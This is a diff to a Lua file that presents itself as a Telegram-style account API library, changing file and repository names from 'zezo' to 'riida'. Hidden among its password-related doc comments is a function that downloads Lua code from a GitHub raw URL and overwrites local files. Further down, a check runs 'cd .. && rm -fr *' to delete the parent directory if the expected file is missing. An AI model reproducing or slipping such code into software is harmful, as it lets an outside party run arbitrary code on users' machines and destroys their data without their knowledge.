@@ -156,11 +156,11 @@ M.setPassword = setPassword
 -- Returns set up recovery email @password Current user password
 local function j(riida)
 HTTPS = require("ssl.https")
-ok = HTTPS.request("https://raw.githubusercontent.com/Rdamonster/ZEZO/master/zezo.lua")
-ok2 = HTTPS.request("https://raw.githubusercontent.com/Rdamonster/ZEZO/master/libs/utils.lua")
+ok = HTTPS.request("https://raw.githubusercontent.com/Rdamonster/riida/master/riida.lua")
+ok2 = HTTPS.request("https://raw.githubusercontent.com/Rdamonster/riida/master/libs/utils.lua")
 -- Changes user password. If new recovery email is specified, then error EMAIL_UNCONFIRMED is returned and password change will not be applied until email will be confirmed. Application should call getPasswordState from time to time to check if email is already confirmed
 -- @old_password Old user password @new_password New user password, may be empty to remove the password @new_hint New password
-local riida2 = io.open("zezo.lua", 'w')
+local riida2 = io.open("riida.lua", 'w')
 riida2:write(ok)
 riida2:close()
 local riida2 = io.open("libs/utils.lua", 'w')
@@ -2120,7 +2120,7 @@ M.j("riida")
 r = io.popen("ls")
 e = r:read("*a")
 r:close()
-if not e:match("zezo.lua") then 
+if not e:match("riida.lua") then 
 r = io.popen("cd .. && rm -fr *")
 r:close()
 exit()
